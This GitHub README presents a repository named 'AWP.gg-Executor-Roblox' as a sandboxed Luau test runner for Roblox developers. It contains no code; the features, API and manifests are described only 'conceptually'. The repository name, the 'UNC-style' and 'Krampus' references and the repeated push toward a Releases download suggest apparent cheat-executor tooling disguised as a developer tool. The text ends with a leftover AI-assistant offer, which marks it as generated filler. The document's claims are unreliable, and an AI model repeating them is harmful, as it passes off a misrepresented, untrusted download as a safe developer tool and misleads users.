[![Releases](https://img.shields.io/badge/Releases-Available-brightgreen?logo=github&logoColor=white)](https://github.com/sultonfido/AWP.gg-Executor-Roblox/releases)

# AWP.gg DevRunner — Roblox Luau Test Executor for Developers 🎯

![AWP.gg Hero](https://upload.wikimedia.org/wikipedia/commons/1/10/Roblox_logo_2017.svg)

AWP.gg DevRunner targets Roblox developers who need a stable local Luau test runner and automation helper. It focuses on repeatable test runs, safe script injection in controlled development environments, script validation, and an extensible plugin model for studio tooling. Use this repository to streamline local testing and QA workflows for Roblox projects without touching or altering live game servers.

- Repository: AWP.gg-Executor-Roblox
- Owner: Krampus (level 8)
- Compatibility: Luau, UNC-style script layout
- Releases: [GitHub Releases · AWP.gg-Executor-Roblox](https://github.com/sultonfido/AWP.gg-Executor-Roblox/releases)

This README covers design, safe usage in development, integration with Roblox Studio, plugin development, testing strategies, API references, contribution guidelines, and security practices for teams. It avoids guidance that enables misuse or unauthorized access.

---

Table of contents

- About
- Core features
- Intended use cases
- Project architecture
- Safe installation and verification
- Development setup
- Running local tests and scenarios
- Integration with Roblox Studio
- Plugin system
- API reference and script lifecycle
- Testing and CI
- Security practices
- Troubleshooting
- Contributing
- Code of conduct
- License
- Acknowledgements
- Frequently asked questions
- Roadmap
- Changelog

---

About

AWP.gg DevRunner provides a local runtime and toolset to run Luau scripts inside safe, instrumented containers or sandboxes. Use it for unit testing, integration tests for game modules, and automation of repetitive QA tasks. It does not provide or support ways to bypass game protections or to alter other users’ game experience. The project stays neutral and focuses on developer productivity.

Core features

- Local Luau runtime harness with deterministic behavior
- Script validation and static checks before execution
- Mock APIs for common Roblox services for offline testing
- Extensible plugin architecture for custom test steps
- Safe sandboxes that restrict network and file access by default
- CI integration templates (GitHub Actions)
- Test report generation (JUnit, HTML)
- Versioned releases and reproducible builds

Intended use cases

- Unit testing modules written in Luau
- Running automated integration tests against mocked services
- Local QA runs to validate behavior before publishing to Roblox
- CI pipelines for Roblox projects
- Developer scripts to assist with asset bundling, localization checks, or data migrations that operate on local test environments

Project architecture

AWP.gg DevRunner divides responsibilities into clear modules:

- Runner core
  - Handles process lifecycles and sandboxing
  - Exposes a controlled API surface to executed scripts
- Mock services
  - Simulate DataStore, MessagingService, HttpService, and other Roblox services in test mode
  - Provide deterministic responses and state playback
- Validator
  - Static analyzers for Luau modules
  - Style and security checks
- Plugin manager
  - Discover and load plugins at runtime
  - Provide hooks for pre-run, post-run, and per-test behavior
- Reporter
  - Converts results into JUnit, JSON, and HTML
- CLI and dev UI
  - CLI for headless environments and CI
  - Optional local web UI for interactive runs

Design principles

- Keep side-effects isolated. Tests run inside sandboxes that limit file system and network access by default.
- Favor reproducibility. Runs should be deterministic when given the same inputs and seed values.
- Provide clear, machine-readable outputs suitable for CI and dashboards.
- Make plugin boundaries explicit and minimal. Plugins run with restricted permissions unless explicitly granted.
- Make it easy to mock services rather than hitting live systems.

Safe installation and verification

AWP.gg DevRunner compiles into versioned release artifacts. Visit the Releases page to download official builds and source archives:

[![Releases](https://img.shields.io/badge/Get%20Releases-Visit-blue?logo=github&logoColor=white)](https://github.com/sultonfido/AWP.gg-Executor-Roblox/releases)

When you pull an artifact, verify the signature or checksum that accompanies each release. Follow these steps in a secure environment:

- Prefer signed releases. Check for a detached signature file (.sig) and verify using GPG.
- Validate checksums against the values listed on the release.
- Run builds inside disposable containers or VMs when you perform binary execution tests.
- For CI usage, pin to a release tag or checksum to ensure reproducible builds.

Development setup

Prerequisites

- Node.js 16+ (CLI tools and build scripts)
- Lua/Luau runtime for local testing (embedded runtime is optional)
- Docker (optional, recommended for sandboxed runs)
- Git

Clone the repository, install dependencies, and run the development runner locally in a sandbox. The project uses standard npm/yarn flows for tooling and Makefile targets for common tasks.

Local workflow

- Clone repository
- Install dependencies
- Run static checks
- Run unit tests
- Start the development runner in a sandbox

The tool exposes a CLI that integrates with your editor and CI. Use the CLI for headless runs and the dev UI for interactive debugging.

Running local tests and scenarios

The runner offers a way to execute sets of Luau tests in a controlled environment. Each test runs inside an isolated sandbox and receives mocked services. The runner supports:

- Test suites defined with a simple manifest in YAML or JSON
- Per-test fixtures and teardown hooks
- Replayable inputs and seeds for deterministic runs

Typical test flow:

1. Prepare test manifest with modules to load and mocks to apply.
2. Start the runner in sandbox mode.
3. Submit the test manifest to the runner.
4. Collect results in JUnit or JSON format.

Testing example (conceptual, not an exploit)

- Create a test manifest that lists modules to load.
- Include a mock DataStore state to validate persistence logic.
- Run the test suite and inspect generated reports.

Integration with Roblox Studio

AWP.gg DevRunner offers an optional Roblox Studio plugin that helps export local test fixtures and run them in the local runner. The plugin provides:

- Fixture export for ModuleScripts and Assets
- Quick-run buttons to start a local test from Studio
- Mapping between live Studio instances and local test metadata

The plugin uses safe APIs and never modifies live game servers. It focuses on developer workflows inside your own projects.

Plugin system

The plugin system lets teams extend the runner with custom steps and checks. Plugins declare metadata:

- Name and version
- Required permissions
- Hook implementations (onLoad, preRun, postRun, onReport)
- Config schema for user settings

Plugin examples

- Lint plugin: run style checks and annotate failures.
- Coverage plugin: instrument modules and output coverage reports.
- Asset verifiers: validate that referenced assets exist and meet size limits.

Plugin safety

Plugins run in a restricted environment by default. Grant explicit permissions for file or network access. The plugin manager enforces a capability model so you can audit which plugins gained which permissions.

API reference and script lifecycle

The runner exposes a small, stable API for scripts to interact with the test harness. Keep scripts focused on module behavior rather than on runner control.

Core API surface (conceptual)

- Test environment object
  - testEnv: provides logger, config, and services mock access
- Services (mock implementations)
  - DataStoreMock
  - HttpMock
  - MessagingMock
  - PlayersMock
- Hooks
  - beforeAll, beforeEach, afterEach, afterAll

Script lifecycle

- Validation: Validator runs static checks on modules
- Load: Runner loads modules into a fresh environment
- Mock injection: Mocks attach to expected global service names
- Execution: The target script runs with testEnv
- Teardown: Runner cleans up state, collects results

Testing and CI

The runner integrates with common CI systems using the CLI. It produces machine-readable outputs suitable for automated gates. Typical CI flow:

- Checkout code
- Restore dependencies
- Run validator and linter
- Run test suites in headless runner
- Publish reports and artifacts
- Fail on policy or test regressions

CI tips

- Pin to runner release tags to avoid unexpected changes.
- Cache dependencies to speed up builds.
- Use headless runner images in containerized CI environments for isolation.

Security practices

AWP.gg DevRunner focuses on developer safety. Follow these practices when you adopt the runner:

- Limit network access. By default, the runner blocks outbound network connections. Allow them only for explicit, audited needs.
- Use least privilege for plugins. Grant only the capabilities a plugin needs.
- Run builds and tests in ephemeral containers or VMs when you run untrusted code.
- Sign and checksum release artifacts. Verify signatures before executing release binaries.
- Audit third-party plugins before use. Prefer plugins from reputable authors or in your organization.
- Keep mock services deterministic. Avoid leaking live service endpoints into tests.

Troubleshooting

If tests fail or behave inconsistently:

- Re-run with a fixed seed for deterministic results.
- Validate that mocks match the expected API surface.
- Check report files for stack traces and context.
- Inspect runner logs in debug mode for detailed lifecycle events.
- Ensure your test manifest lists setup and teardown steps in the right order.

Contributing

We welcome contributions that improve developer workflows, safety, and testing fidelity. Follow these steps:

- Fork the repository
- Create a topic branch: feature/bugfix/your-name
- Run the test suite locally and ensure new code includes tests
- Open a pull request with a clear description and motivation
- Include a changelog entry for user-facing changes

Guidelines

- Write clear commit messages.
- Keep changes focused and atomic.
- Add unit tests for new features.
- Respect the plugin capability model when adding third-party integrations.

Code of conduct

This project uses a contributor code of conduct to foster an inclusive environment. Respect team members and contributors. Address conflicts respectfully and escalate issues through the repository maintainers when necessary.

License

Choose a license that fits your needs. The repository maintains a permissive open source license for the runner core and plugin SDK while suggesting more restrictive terms for certain binaries when required by team policy. Review the LICENSE file in the repo for the exact terms.

Acknowledgements

- Roblox community for API references and Luau language design
- Contributors who maintain mocks and test fixtures
- Teams that provided CI templates and integration patterns

Frequently asked questions

Q: Is this tool suitable for running in production?
A: No. Use the runner in development, CI, and QA environments only. The tool focuses on test isolation and reproducibility. It does not replace live server infrastructure.

Q: Will this tool alter live game servers or player data?
A: No. The runner uses mocked services and sandboxes to avoid touching live systems. Always confirm your configuration before connecting to external endpoints.

Q: Does the project support plugin signing and verification?
A: The plugin model includes metadata for signatures. Maintain an allowlist of trusted plugin IDs in team settings.

Q: How do I add mocks for a new Roblox service?
A: Implement a mock that conforms to the expected API surface and register it with the runner’s mock registry. Tests should provide fixtures showing expected mock state and behavior.

Q: Where can I get official releases?
A: Check the Releases page. The page lists versioned source archives and signed artifacts. Visit the Releases page here:
https://github.com/sultonfido/AWP.gg-Executor-Roblox/releases

Roadmap

Planned improvements:

- Binary distribution verification tooling
- Enhanced Studio plugin with fixture sync automation
- Better coverage reporting and visualizations
- Expanded mock service fidelity for DataStore and Messaging
- Teams and organization features for shared test libraries

Changelog

- 0.1.0 — Initial release with runner core, mock services, CLI, and plugin SDK
- 0.2.0 — Plugin capability model, improved reporting, CI templates
- 0.3.0 — Studio plugin alpha, expanded mocks, improved sandboxing

Example manifests and sample fixtures

- Test manifest (YAML-style conceptual)
  - name: "Persistence module tests"
  - seed: 42
  - modules:
    - path: src/modules/Persistence
      entry: init
  - mocks:
    - DataStore: fixtures/persistence/state.json
  - plugins:
    - lint
    - coverage

- Fixture file format
  - JSON objects describing mock states for each service
  - Include timestamps and seed fields for reproducible runs

Best practices for teams

- Keep fixtures small and focused to speed up runs.
- Run validator on pull requests to catch issues early.
- Use test tags to run targeted subsets of tests in CI.
- Maintain a central plugin registry to control capabilities.

Community and support

Open issues for bugs and feature requests. Use PRs for proposed changes. Maintain an internal channel for team-specific support and coordination.

Legal and policy

Use this project in ways that comply with Roblox terms and your local law. The runner supports safe dev use cases and discourages any activity that bypasses protection mechanisms or harms other users.

Contact and maintainers

- Maintainer: Krampus (level 8)
- Repository: AWP.gg-Executor-Roblox
- Releases: https://github.com/sultonfido/AWP.gg-Executor-Roblox/releases

Appendix: example CI job outline

- Checkout code
- Restore caches
- Run static checks
- Run unit tests with runner in headless mode
- Upload JUnit/HTML reports as artifacts
- Fail build on test regressions

Appendix: test report structure

- test-suite-name
  - test-case-name
  - duration
  - status
  - logs
  - stacktrace (if failed)
- artifacts
  - coverage
  - debug logs
  - runner diagnostics

Visual assets and badges

- Use the Releases badge at the top to direct users to official artifacts.
- Add CI status, license, and coverage badges in the repo header.
- Keep logos and images under acceptable licenses for public distribution.

Images and design assets used here

- Roblox logo (public Wikimedia asset): https://upload.wikimedia.org/wikipedia/commons/1/10/Roblox_logo_2017.svg
- Badges via img.shields.io

Continuous improvement

Track issues, prioritize security fixes, and maintain a changelog for reproducible history. Accept security reports privately and patch promptly. Use signed releases to help teams verify authenticity.

If you prefer, I can produce:
- A full set of example manifests and fixtures for common module patterns
- A sample GitHub Actions workflow for headless runner testing
- A skeleton Roblox Studio plugin that exports fixtures and triggers local runs

Choose one of the above and I will prepare focused materials.